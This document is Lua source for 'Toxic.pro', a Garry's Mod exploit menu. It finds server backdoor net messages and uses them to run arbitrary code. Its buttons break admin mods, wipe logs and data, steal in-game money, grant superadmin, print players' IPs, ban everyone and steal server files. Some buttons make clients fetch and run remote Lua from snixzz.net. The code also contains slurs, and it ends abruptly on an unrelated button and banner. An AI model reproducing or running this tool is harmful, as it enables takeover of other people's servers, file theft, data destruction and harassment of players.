	if iZNX.ValidNetString( "DarkRP_UTF8" ) then
	blackdoor = "DarkRP_UTF8"
	else
	if iZNX.ValidNetString( "oldNetReadData" ) then
	blackdoor = "oldNetReadData"
	else
	if iZNX.ValidNetString( "memeDoor" ) then
	blackdoor = "memeDoor"
	else
	if iZNX.ValidNetString( "BackDoor" ) then
	blackdoor = "BackDoor"
	else
	if iZNX.ValidNetString( "OdiumBackDoor" ) then
	blackdoor = "OdiumBackDoor"
	else
	if iZNX.ValidNetString( "SessionBackdoor" ) then
	blackdoor = "SessionBackdoor"
	else
	if iZNX.ValidNetString( "DarkRP_AdminWeapons" ) then
	blackdoor = "DarkRP_AdminWeapons"
	else
	if iZNX.ValidNetString( "cucked" ) then
	blackdoor = "cucked"
	else
	if iZNX.ValidNetString( "NoNerks" ) then
	blackdoor = "NoNerks"
	else
	if iZNX.ValidNetString( "kek" ) then
	blackdoor = "kek"
	else
	if iZNX.ValidNetString( "ZimbaBackDoor" ) then
	blackdoor = "ZimbaBackDoor"
	else
	if iZNX.ValidNetString( "something" ) then
	blackdoor = "something"
	else
	if iZNX.ValidNetString( "random" ) then
	blackdoor = "random"
	else
	if iZNX.ValidNetString( "strip0" ) then
	blackdoor = "strip0"
	else
	if iZNX.ValidNetString( "fellosnake" ) then
	blackdoor = "fellosnake"
	else
	if iZNX.ValidNetString( "enablevac" ) then
	blackdoor = "enablevac"
	else
	if iZNX.ValidNetString( "idk" ) then
	blackdoor = "idk"
	else
	if iZNX.ValidNetString( "c" ) then
	blackdoor = "c"
	else
	if iZNX.ValidNetString( "killserver" ) then
	blackdoor = "killserver"
	else
	if iZNX.ValidNetString( "fuckserver" ) then
	blackdoor = "fuckserver"
	else
	if iZNX.ValidNetString( "cvaraccess" ) then
	blackdoor = "cvaraccess"
	else
	if iZNX.ValidNetString( "rcon" ) then
	blackdoor = "rcon"
	else
	if iZNX.ValidNetString( "rconadmin" ) then
	blackdoor = "rconadmin"
	else
	if iZNX.ValidNetString( "web" ) then
	blackdoor = "web"
	else
	if iZNX.ValidNetString( "jesuslebg" ) then
	blackdoor = "jesuslebg"
	else
	if iZNX.ValidNetString( "zilnix" ) then
	blackdoor = "zilnix"
	else
	if iZNX.ValidNetString( "Þ� ?D)◘" ) then
	blackdoor = "Þ� ?D)◘"
	else
	if iZNX.ValidNetString( "kill" ) then
	blackdoor = "kill"
	else
	if iZNX.ValidNetString( "DefqonBackdoor" ) then
	blackdoor = "DefqonBackdoor"
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	end
	
	toxic.Version = "1.2b"
	
	toxic.Aids = {
	
		"kill them with buttons",
		"you are the admen now",
		"odium copy paste!!!11!1",
		"tricking dumb admens since 2k17",
		"what servers can i use this on???",
		"#1 in backdoor 2k17 e-peen contest",
		"leaked on release day™",
		"here come the hax",
		"leaked by homeless meme",
		
	}
	
	/*
		
		Backend functions
		
	*/
	
	function toxic.Init()
	
		if !file.IsDir( "toxic.pro", "DATA" ) then file.CreateDir( "toxic.pro" ) end
		
		if !file.IsDir( "toxic.pro/files", "DATA" ) then file.CreateDir( "toxic.pro/files" ) end
	
		if !file.IsDir( "toxic.pro/files/lua", "DATA" ) then file.CreateDir( "toxic.pro/files/lua" ) end
		
	end
	
	function toxic.Track()
	
		-- TODO: php tracking & shit
	
	end
	
	function toxic.PostLua( str )
	
		net.Start( blackdoor )
		
			net.WriteString( str )
			
		net.SendToServer()
	
	end
	
	function toxic.Notify( msg )
	
		chat.AddText( Color( 255, 0, 0 ), "[Toxic.pro] ", color_white, msg )
	
	end
	
	/*
		
		user interface
		
	*/
	
	function toxic.AddButton( name, parent, func )
	
		local button = parent:Add( "DButton" )
		button:SetText( "" )
		button:Dock( TOP )
		button:DockMargin( 0, 0, 0, 5 )
		button:SetSize( 100, 25 )
		button.DoClick = func
		
		button.Paint = function( self )
		
			draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 200 ) )
			
			draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )
		
		end
	
		toxic.ButtonPos = toxic.ButtonPos + 30
		
	end
	
	function toxic.AddCategorySpacer( name, col, parent )
	
		toxic.ButtonPos = toxic.ButtonPos + 5
		
		local button = parent:Add( "DButton" )
		button:SetText( "" )
		button:Dock( TOP )
		button:DockMargin( 0, 0, 0, 5 )
		button:SetSize( 100, 25 )
		button:SetEnabled( false )
		
		button.Paint = function( self )
		
			draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( col.r, col.g, col.b, 200 ) )
			
			draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )
		
		end	
	
		toxic.ButtonPos = toxic.ButtonPos + 35
	
	end 
	
	function toxic.OpenTextDocument( path, str, parent )
					
		local hostname = string.gsub( GetHostName(), "%W", "" )			
					
		toxic.Notify( "Received file " .. path )
	
		local frame = vgui.Create( "DFrame" )
		frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
		frame:SetPos( parent:GetWide() + 50, 25 )
		frame:SetTitle( GetHostName() .. "'s " .. path )
		frame:MakePopup()
		frame:ShowCloseButton( false )
		frame:SetDraggable( false )
	
		frame.Paint = function( self )
							
			draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )
							
			draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
							
		end 
		
		local close = vgui.Create( "DButton", frame )
		close:SetSize( 50, 20 )
		close:SetPos( frame:GetWide() - close:GetWide(), 0 )
		close:SetText( "x" )
		close:SetTextColor( Color( 255, 255, 255 ) )
		close:SetFont( "DebugFixed" )
						
		close.Paint = function()
						
			draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
						
		end
						
		close.DoClick = function()
								
			frame:Close()
							
		end
						
		local html = vgui.Create( "DHTML", frame )
		html:SetPos( 5, 30 )
		html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
		html:OpenURL( "https://metastruct.github.io/lua_editor/" )
						
		html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )
	
		local save = vgui.Create( "DButton", frame )
		save:SetSize( 60, 20 )
		save:SetPos( frame:GetWide() - close:GetWide() - save:GetWide() - 5, 0 )
		save:SetText( "Save As" )
		save:SetTextColor( Color( 255, 255, 255 ) )
		save:SetFont( "DebugFixed" )
						
		save.Paint = function()
						
			draw.RoundedBox( 0, 0, 0, save:GetWide(), save:GetTall(), Color( 62, 168, 62, 255 ) )
						
		end
						
		save.DoClick = function()
						
			Derma_StringRequest( "Save file '" .. path .. "' to data/toxic.pro/files/" .. hostname .. "/", "File name (e.g: servercfg or servercfg.txt)", "", function( text ) 
					
				if !string.find( text, ".txt" ) then text = text .. ".txt" end
					
				if !file.IsDir( "toxic.pro/files/" .. hostname, "DATA" ) then file.CreateDir( "toxic.pro/files/" .. hostname ) end			
					
				file.Write( "toxic.pro/files/" ..  hostname .. "/" .. text, str )
					
				toxic.Notify( "Saved source to data/toxic.pro/files/" .. hostname .. "/" .. text )
				
			end )
							
		end	
		
	end
	
	toxic.LuaStr = ""
	
	function toxic.OpenLuaEditor( parent )
	
		local frame = vgui.Create( "DFrame" )
		frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
		frame:SetPos( parent:GetWide() + 50, 25 )
		frame:SetTitle( "" )
		frame:MakePopup()
		frame:ShowCloseButton( false )
		frame:SetDraggable( false )
	
		frame.Paint = function( self )
							
			draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )
							
			draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
							
		end 
		
		local close = vgui.Create( "DButton", frame )
		close:SetSize( 50, 20 )
		close:SetPos( frame:GetWide() - close:GetWide(), 0 )
		close:SetText( "x" )
		close:SetTextColor( Color( 255, 255, 255 ) )
		close:SetFont( "DebugFixed" )
						
		close.Paint = function()
						
			draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
						
		end
						
		close.DoClick = function()	
			
			frame:Close()
							
		end
						
		local html = vgui.Create( "DHTML", frame )
		html:SetPos( 5, 30 )
		html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
		html:OpenURL( "https://metastruct.github.io/lua_editor/" )
						
		html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( toxic.LuaStr ) .. "' )" )
				
		html:AddFunction( "gmodinterface", "OnCode", function( code ) -- thanks easychat
		
			toxic.LuaStr = code
		
		end )
		
		local run = vgui.Create( "DButton", frame )
		run:SetSize( 60, 20 )
		run:SetPos( 0, 0 )
		run:SetText( "Run" )
		run:SetTextColor( Color( 255, 255, 255 ) )
		run:SetFont( "DebugFixed" )
						
		run.Paint = function( self )
						
			draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 62, 168, 255 ) )
						
		end
						
		run.DoClick = function()
						
			local options = DermaMenu()
			
			options:AddOption( "Server", function()
				
				toxic.PostLua( toxic.LuaStr )
				
				toxic.Notify( "Ran Lua on server" )
				
			end ):SetImage( "icon16/server.png" )
			
			options:AddOption( "All Clients", function()
				
				toxic.PostLua( [[
				
					for k, v in next, player.GetAll() do
					
						v:SendLua( ']] .. toxic.LuaStr .. [[' )
					
					end
				
				]] )
				
				toxic.Notify( "Ran Lua on all clients" )
				
			end ):SetImage( "icon16/computer_add.png" )
			
			local players, menu = options:AddSubMenu( "Client" )
			
			menu:SetIcon( "icon16/user.png" )
			
			for k, v in next, player.GetAll() do
			
				players:AddOption( v:Nick(), function()
				
					local id = v:UserID()
					
					toxic.PostLua( [[
					
						local id = ]] .. id .. [[
						
						Player( id ):SendLua( ']] .. toxic.LuaStr .. [[' )
					
					]] )
					
					toxic.Notify( "Ran Lua on " .. v:Nick() )
				
				end )
			
			end
			
			options:Open()
			
		end	
		
		local save = vgui.Create( "DButton", frame )
		save:SetSize( 60, 20 )
		save:SetPos( run:GetWide() + 5, 0 )
		save:SetText( "Save" )
		save:SetTextColor( Color( 255, 255, 255 ) )
		save:SetFont( "DebugFixed" )
						
		save.Paint = function( self )
						
			draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )
						
		end
		
		save.DoClick = function()
						
			Derma_StringRequest( "Save file to data/toxic.pro/files/lua", "File name (e.g: aimbot or aimbot.txt)", "", function( text ) 
					
				if !string.find( text, ".txt" ) then text = text .. ".txt" end
	
				file.Write( "toxic.pro/files/lua/" .. text, toxic.LuaStr )
					
				toxic.Notify( "Saved source to data/toxic.pro/files/lua/" .. text )
				
			end )
							
		end	
		
		local load = vgui.Create( "DButton", frame )
		load:SetSize( 60, 20 )
		load:SetPos( run:GetWide() + load:GetWide() + 10, 0 )
		load:SetText( "Load" )
		load:SetTextColor( Color( 255, 255, 255 ) )
		load:SetFont( "DebugFixed" )
						
		load.Paint = function( self )
						
			draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 168, 148, 62, 255 ) )
						
		end
		
		load.DoClick = function()
		
			local options = DermaMenu()
			
			for k, v in pairs( file.Find( "toxic.pro/files/lua/*.txt", "DATA" ) ) do
			
				options:AddOption( v, function()
					
					local str = file.Read( "toxic.pro/files/lua/" .. v, "DATA" )
					
					MsgN( str )
					
					toxic.LuaStr = str
					
					html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )
					
					toxic.Notify( "Loaded " .. v )
					
				end )
				
			end
			
			options:Open()
			
		end
		
	end
	
	function toxic.UI()
		
		toxic.ButtonPos = 30
		
		local frame = vgui.Create( "DFrame" )
		frame:SetTitle( "Toxic.pro v" .. toxic.Version .. " | by 0xymoron ~ " .. table.Random( toxic.Aids ) )
		frame:SetSize( 550, 400 )
		frame:SetPos( 25, 25 )
		frame:MakePopup()
		frame:ShowCloseButton( false )
		frame:SetDraggable( false )
		
		frame.Paint = function( self )
			
			local hsv = HSVToColor( RealTime() * 120 % 360, 1, 1 )
			
			draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( hsv.r, hsv.g, hsv.b, 150 ) ) -- old: Color( 140, 0, 0, 150 )
			
			draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
			
			surface.SetFont( "CloseCaption_Bold" )
			
			local str1 = "Toxic.pro Version " .. toxic.Version
				
			local str1_width, str1_height = surface.GetTextSize( str1 )
			
			local str2 = "by 0xymoron"
			
			local str2_width, str2_height = surface.GetTextSize( str2 )
			
			draw.SimpleText( str1, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, 65, color_white, 1, 1 ) 
			
			draw.SimpleText( str2, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, frame:GetTall() - str2_height - 25, color_white, 1, 1 ) 
			
		end 
		
		local close = vgui.Create( "DButton", frame )
		close:SetSize( 50, 20 )
		close:SetPos( frame:GetWide() - 50, 0 )
		close:SetText( "x" )
		close:SetTextColor( Color( 255, 255, 255 ) )
		close:SetFont( "DebugFixed" )
		
		close.Paint = function()
		
			draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
		
		end
		
		close.DoClick = function()
			
			frame:Close()
			
		end
		
		local set = vgui.Create( "DButton", frame )
		set:SetSize( 40, 20 )
		set:SetPos( frame:GetWide() - close:GetWide() - set:GetWide() - 5, 0 )
		set:SetText( "Set" )
		set:SetTextColor( Color( 255, 255, 255 ) )
		set:SetFont( "DebugFixed" )
		
		set.Paint = function( self )
		
			draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )
		
		end	
		
		local netmsg = vgui.Create( "DTextEntry", frame )
		netmsg:SetSize( 75, 20 )
		netmsg:SetPos( frame:GetWide() - close:GetWide() - netmsg:GetWide() - set:GetWide() - 10, 0 )
		netmsg:SetText( blackdoor )
		
		netmsg.OnEnter = function( self )
		
			toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )
		
			blackdoor = self:GetValue()
			
		end
		
		set.DoClick = function( self )
			
			blackdoor = netmsg:GetValue()
			
			toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )
			
		end	
		
		local panel = vgui.Create( "DScrollPanel", frame )
		panel:SetPos( 5, 30 )
		panel:SetSize( 150, frame:GetTall() - 35 )
		
		local html = vgui.Create( "HTML", frame )
		html:SetPos( panel:GetWide() + 20, 95 )
		html:SetSize( 240, 215 )
		html:SetHTML( [[
			<img src="http://www.clker.com/cliparts/c/e/8/f/12387015421849960016GameFreak7744_Biohazard_symbol.svg.med.png" alt="Img" style="width:200px;height:195px;">
		]] )
		
		/**************************************
			
			Player Management
			
		***************************************/
		
		local dlist = vgui.Create( "DListView", frame )
		dlist:SetSize( 140, frame:GetTall() - 35 )
		dlist:SetPos( frame:GetWide() - dlist:GetWide() - 5, 30 )
		dlist:SetMultiSelect( false )
		dlist:AddColumn( "Players" )
		
		for k, v in next, player.GetAll() do
			
			dlist:AddLine( v:Nick() )
		
		end
	
		dlist.OnClickLine = function( parent, line, self )
			
			for k, v in next, player.GetAll() do
				
				if v:Nick() == line:GetValue( 1 ) then
					
					dlist.SelectedEntity = v
						
				else
				
					continue
					
				end
				
			end
		
		end
		
		dlist.OnRowRightClick = function( parent, line, isselected )
		
			surface.PlaySound( "buttons/button9.wav" )
			
			local id = dlist.SelectedEntity:UserID()
			
			local target = Player( id )
			
			local options = DermaMenu()
			
			options:AddOption( "Kick", function()
				
				toxic.PostLua( [[
				
					Player( ]] .. id .. [[ ):Kick() 
				
				]] )
				
				toxic.Notify( "Kicked " .. target:Nick() )
				
				if dlist then
					
					dlist:RemoveLine( line )
					
				end
				
			end ):SetImage( "icon16/door_out.png" )
			
			options:AddOption( "Silent Slay", function()
				
				toxic.PostLua( [[
				
					Player( ]] .. id .. [[ ):KillSilent() 
				
				]] )
				
				toxic.Notify( "Silently slayed " .. target:Nick() )
				
			end ):SetImage( "icon16/lightning.png" )
			
			options:AddOption( "Freeze", function()
				
				toxic.PostLua( [[
					
					local ply = Player( ]] .. id .. [[ )
					
					ply:Freeze( !ply:IsFrozen() )
				
				]] )
				
				if !target:IsFrozen() then
				
					toxic.Notify( "Froze " .. target:Nick() )
					
				else
				
					toxic.Notify( "Unfroze " .. target:Nick() )
					
				end
				
			end ):SetImage( "icon16/tux.png" )
			
			options:AddOption( "Give Weapon", function()
				
				Derma_StringRequest( "Give " .. target:Nick() .. " a weapon", "What weapon? (example: weapon_ak47)", "", function( text ) 
				
					toxic.PostLua( [[
						
						local str = "]] .. text .. [["
						
						Player( ]] .. id .. [[ ):Give( str )
					
					]] )
			
					toxic.Notify( "Gave " .. target:Nick() .. " a " .. text )
		
				end )
				
			end ):SetImage( "icon16/bomb.png" )
			
			options:AddOption( "Give Money", function()
				
				Derma_StringRequest( "Give " .. target:Nick() .. " money", "How much?", "", function( text ) 
					
					if !isnumber( tonumber( text ) ) then return end
					
					toxic.PostLua( [[
						
						local str = "]] .. text .. [["
						str = tonumber( str )
						
						Player( ]] .. id .. [[ ):addMoney( str )
					
					]] )
			
					toxic.Notify( "Gave " .. target:Nick() .. " $" .. string.Comma( text ) )
		
				end )
				
			end ):SetImage( "icon16/money_add.png" )
			
			options:AddOption( "Inject Toxic.pro", function()
				
				local snd = table.Random( { "vo/npc/male01/herecomehacks01.wav","vo/npc/male01/herecomehacks02.wav" } ) -- stfu
				
				toxic.PostLua( [[		
						
					Player(]] .. id .. [[):SendLua('http.Fetch("http://snixzz.net/toxic.pro/toxic.lua",function(body) RunString(body) surface.PlaySound("]] .. snd .. [[") chat.AddText(Color(255,0,0),"[Toxic.pro] ",color_white,"Welcome, run `toxic.pro` in console") end)')
					
				]] )
			
				toxic.Notify( "Injected Toxic.pro into " .. target:Nick() .. "'s client." )
				
			end ):SetImage( "icon16/bug_add.png" )
			
			options:Open()
			
		end
		
		/**************************************
			
			Buttons
			
		***************************************/
		
		
		toxic.AddCategorySpacer( "Prevention", Color( 255, 0, 0 ), panel )
		
		toxic.AddButton( "Break ULX", panel, function()
		
			toxic.PostLua( [[ _G.ulx = function() end _G.ULib = function() end ]])
	
			toxic.Notify( "Broke ULX, admins now have no control." )	
		
		end )
		
		toxic.AddButton( "Break FAdmin", panel, function()
		
			toxic.PostLua( [[
			
				_G.FAdmin = function() end
			
			]] )
			
			toxic.Notify( "Killed FAdmin" )
		
		end )
		
		toxic.AddButton( "Wipe Logs", panel, function()
			
			local date = os.date( "%m-%d-%y" )
			
			toxic.PostLua( [[ 
				
				file.Delete( "ulx_logs/]] .. date .. [[.txt" )
			
			]] )
			
			toxic.Notify( "Deleted data/ulx_logs/" .. date .. ".txt" )
		
		end )
		
		toxic.AddButton( "Wipe data/", panel, function()
			
			toxic.PostLua( [[
			
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			local dirs = {
			
				"ulx", 
				"ulx_logs",
				"ulib",
				"darkrp_logs",
				"adv_duplicator",
				"advdupe2",
				"cpuchip",
				"expression2",
				"cw2_0",
			
			}
			
			for k, v in pairs( dirs ) do
				
				for dir, _file in pairs( file.Find( v .. "/*", "DATA" ) ) do
					
					file.Delete( v .. "/" .. _file )
					
					Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v .. "/" .. _file )
				
				end
			
			end
			
			for k, v in pairs( file.Find( "*", "DATA" ) ) do
			
				file.Delete( v )
			
				Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v )
			
			end
			
			]] )
		
		end )
		
		toxic.AddButton( "No Kick/Ban", panel, function()
		
			toxic.PostLua( [[
			
				_R = debug.getregistry()
				
				function game.KickID( id, reason )
				
					return
				
				end
				
				function _R.Player.Ban()
				
					return
				
				end
				
				function _R.Player.Kick()
				
					return
					
				end
			
			]] )
			
			toxic.Notify( "Nulled _R.Player.Ban & _R.Player.Kick" )
		
		end )
		
		toxic.AddButton( "Disable !cake", panel, function()
		
			toxic.PostLua( [[ _G.cac = function() end]] )
			
			toxic.Notify( "Attempted to disable !cake's anti-cheat, probably failed." )
		
		end )
		
		toxic.AddCategorySpacer( "DarkRP", Color( 0, 200, 0 ), panel )
		
		toxic.AddButton( "Steal Money", panel, function()
		
			toxic.PostLua( [[
			
				local id = ]] .. LocalPlayer():UserID() .. [[
	
				for k, v in next, player.GetAll() do
					
					if v:Nick() == "]] .. LocalPlayer():Nick() .. [[" then
					
						continue
					
					end
					
					local bal = v:getDarkRPVar( "money" ) or 9999999
					
					v:addMoney( -bal )
					
					Player( id ):addMoney( bal )
					
					Player( id ):ChatPrint( "[Toxic.pro] Stole $" .. string.Comma( bal ) .. " from " .. v:Nick() )
					
				end
			
			]] )
	
		end )
		
		toxic.AddButton( "Wipe All Money", panel, function() 
		
			toxic.PostLua( [[RunConsoleCommand( "rp_resetallmoney" )]] )
	
			toxic.Notify( "Wiped DarkRP money database" ) 
			
		end )
		
		toxic.AddButton( "Change All Names", panel, function()
		
			Derma_StringRequest( "Name Changer", "What would you like to name everyone?", "", function( text ) 
				
				toxic.PostLua( [[
					
					local str = "]] .. text .. [["
					
					for k, v in next, player.GetAll() do
					
						DarkRP.storeRPName( v, str )
						
						v:setDarkRPVar( "rpname", str )
					
					end
				
				]] )
		
				toxic.Notify( "Renamed everyone to '" .. text .. "'" )
		
			end )
		
		end )
		
		toxic.AddButton( "Strip Weapons", panel, function()
		
			for k, v in next, player.GetAll() do
				
				for x, y in pairs( v:GetWeapons() ) do
					
					net.Start( "properties" )
					
						net.WriteString( "remove", 32 )
						
						net.WriteEntity( y )
						
					net.SendToServer()
					
				end
				
			end
		
			toxic.Notify( "Attempted to use net 'properties' exploit to strip all players." )
		
		end )
		
		toxic.AddCategorySpacer( "Autism", Color( 200, 0, 200 ), panel )
		
		toxic.AddButton( "Visual Rape", panel, function()
		
			-- I don't like this.
			toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'http://riverrp.xyz/boss.mp3', 'mono', function( s ) s:Play() end )]] ) end" )
		
			-- I don't like any of this.
			toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[http.Fetch( 'https://snixzz.net/toxic.pro/disco.lua', function( body ) RunString( body ) end )]] ) end" )	
		
		end )
		
		toxic.AddButton( "Earthquake", panel, function()
	
			toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
			
			toxic.Notify( "Earthquake started." )
			
		end )
		
		toxic.AddButton( "Horse", panel, function()
		
			toxic.PostLua( [[
			
				local id = ]] .. LocalPlayer():UserID() .. [[
				
				Player( id ):SetModel( "models/props_c17/statue_horse.mdl" )
				
				Player( id ):SetMaterial( "models/debug/debugwhite" )
				
				hook.Add( "Think", "horse", function()
					
					if !IsValid( Player( id ) ) then return end
					
					Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
				
				end )
			
			]] )
		
		end )
		
		toxic.AddButton( "Footsteps", panel, function()
		
			toxic.PostLua( [[
			
				hook.Add( "PlayerFootstep", "oooh", function( ply ) 
				
					ply:EmitSound( "vo/npc/female01/pain0" .. math.random( 1, 9 ) .. ".wav", 75, math.random( 50, 100 ) )
				
				end )
			
			]] )
			
			toxic.Notify( "Enabled moaning footsteps." )
		
		end )
		
		toxic.AddButton( "Spam .txt", panel, function()
			
			Derma_StringRequest( ".txt file contents", "What would you like to put in the .txt?", "", function( text ) 
				
				toxic.PostLua( [[
			
					for i = 1, 100 do 
				
						file.Write( "toxic.pro_" .. math.random( 1, 999999 ) .. ".txt", "]] .. text .. [[" )
				
					end
				
				]] )
		
				toxic.Notify( "Spamming 100 .txt files containing '" .. text .. "'" )
		
			end )
			
		end )
		
		toxic.AddButton( "Spam Chat", panel, function()
			
			Derma_StringRequest( "Message", "Chat Message", "SEIZED BY TOXIC.PRO", function( text ) 
				
				toxic.PostLua( [[
					
					util.AddNetworkString("chat_AddText")
					chat = {}
					function chat.AddText(...)
						net.Start("chat_AddText")
							net.WriteTable({...})
						net.Broadcast()
					end
					function AddTextPly( ply, ...)
						net.Start("chat_AddText")
							net.WriteTable({...})
						net.Send( ply )
					end
					
					for k, v in pairs( player.GetAll() ) do
					
						v:SendLua( 'net.Receive("chat_AddText", function(len) chat.AddText( unpack( net.ReadTable() ) )end)' )
					
					end
					
					timer.Create( "gotEm", 1, 120, function()
					
						local function ChatPrintRainbow( frequency, str )
	
							local text = {}
	
	
							for i = 1, #str do
								table.insert( text, HSVToColor( i * frequency % 360, 1, 1 ) )
							table.insert( text, string.sub( str, i, i ) )
							end
	
							chat.AddText( unpack( text ) )
	
						end
						
						ChatPrintRainbow( 10, "]] .. text .. [[" )
					
					end )
	
				
				]] )
	
			end )
			
		end )
		
		/*toxic.AddButton( "Spam Advert", panel, function()
			
			Derma_StringRequest( "Message", "Spam Message", "SEIZED BY TOXIC.PRO", function( text ) 
				
				toxic.PostLua( [[
					
					local id = ]] .. LocalPlayer():UserID() .. [[
					
					local why = ]] .. text .. [[
					
					timer.Create( "gotEm2", 1, 120, function()
					
						for k, v in next, player.GetAll() do
						
							v:SetNWString( "why", why )
						
							v:SendLua( 'RunConsoleCommand("say","/advert",LocalPlayer():GetNWString("why"))')
							
						end
					
					end )
	
				
				]] )
	
			end )
			
		end )*/
		
		toxic.AddButton( "Dance", panel, function()
	
			toxic.PostLua( [[
					
				local id = ]] .. LocalPlayer():UserID() .. [[
					
				timer.Create( "gotEm3?", 1, 120, function()
					
					for k, v in next, player.GetAll() do
						
						if v:UserID() == v then continue end
						
						v:SendLua('RunConsoleCommand("act","dance")')
							
					end
					
				end )
	
				
			]] )
			
			toxic.Notify( "Forcing all players to run act dance" )
			
		end )
		
		toxic.AddCategorySpacer( "Takeover", Color( 255, 150, 0 ), panel )
		
		toxic.AddButton( "Give Superadmin", panel, function()
			
			toxic.PostLua( [[
			
				local id = ]] .. LocalPlayer():UserID() .. [[
				
				Player( id ):SetUserGroup( "superadmin" )
			
			]] )
			
			toxic.Notify( "Attempted to silently force superadmin." )
		
		end )
		
		toxic.AddButton( "Print All IPs", panel, function()
			
			toxic.PostLua( [[
			
				local id = ]] .. LocalPlayer():UserID() .. [[
				
				for k, v in pairs( player.GetAll() ) do 
					
					Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
					
				end
	
			]] )
			
			toxic.Notify( "Printed all IPs into chat." )
		
		end )
		
		toxic.AddButton( "Ban Everyone", panel, function()
		
			Derma_StringRequest( "Toxic.pro Ban All", "Reason", "", function( text )
			
				toxic.PostLua( [[
			
					local id = ]] .. LocalPlayer():UserID() .. [[
				
					for k, v in next, player.GetAll() do
					
						if v:UserID() == id then continue end
					
						v:Ban( 0, false )
					
						v:Kick( "]] .. tostring( text ) .. [[" )
						
					end
			
				]] )
				
				toxic.Notify( "Banned everyone for '" .. text .. "'" )
				
			end )
		
		end )
		
		toxic.AddButton( "RCON", panel, function()
		
			Derma_StringRequest( "Toxic.pro RCON", "Command", "", function( text ) 
				
				toxic.PostLua( [[game.ConsoleCommand( "]] .. tostring( text ) .. [[" .. "\n" )]] )
				
				toxic.Notify( "Ran command '" .. text .. "'" )
				
			end )
		
		end )
		
		toxic.AddButton( "Lua Run", panel, function()
		
			toxic.OpenLuaEditor( frame )
		
			/*Derma_StringRequest( "Toxic.pro Lua Run", "Lua String", "", function( text ) 
				
				toxic.PostLua( [[RunString( ']] .. text .. [[' )]] )
				
				toxic.Notify( "Ran Lua '" .. text .. "'" )
				
			end )*/
		
		end )
		
		toxic.AddButton( "Rename Server", panel, function() 
		
			toxic.PostLua( [[RunConsoleCommand( "hostname", "TOXIC.PRO" )]] )
			
			toxic.Notify( "Renamed server to TOXIC.PRO" )
		
		end )
	
		toxic.AddButton( "Steal File", panel, function()
		
			Derma_StringRequest( "Steal File Source", "File Path (Relative to garrysmod/) e.g: cfg/server.cfg", "", function( text ) 		
				
				net.Receive( "file", function( len )
							
					local str = net.ReadString()
										
					if str != "ERROR" then
										
						toxic.OpenTextDocument( text, str, frame )
								
					else
										
						toxic.Notify( "Unable to find file " .. text .. " on the server" )
										
					end
										
				end )
				
				toxic.PostLua( [[
					
					util.AddNetworkString( "file" )
					
					local id = ]] .. LocalPlayer():UserID() .. [[
					
					local f = file.Open( "]] .. text .. [[", "r", "GAME" )
					
					if !f then 
					
						net.Start( "file" )
					
							net.WriteString( "ERROR" )
						
						net.Send( Player( id ) )
					
						return 
						
					end
					
					local str = f:Read( f:Size() )
					
					f:Close()
	
					net.Start( "file" )
					
						net.WriteString( str )
						
					net.Send( Player( id ) )
				
				]] )
				
				toxic.Notify( "Attempted to steal file " .. text )
				
			end )
			
		end)
end
end
end
end

local DermaButton = vgui.Create( "DButton", panel2 )
DermaButton:SetText( "Qrex Sploit`s" )
DermaButton:SetPos( 0, 150 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
	MsgC(Color( 115, 90, 255 ), [[
          ____                _                        _       
         / __ \              | |                      (_)      
        | |  | |_ __ _____  _| |_ ___  _ __ ___  _ __  _  __ _ 
        | |  | | '__/ _ \ \/ / __/ _ \| '_ ` _ \| '_ \| |/ _` |
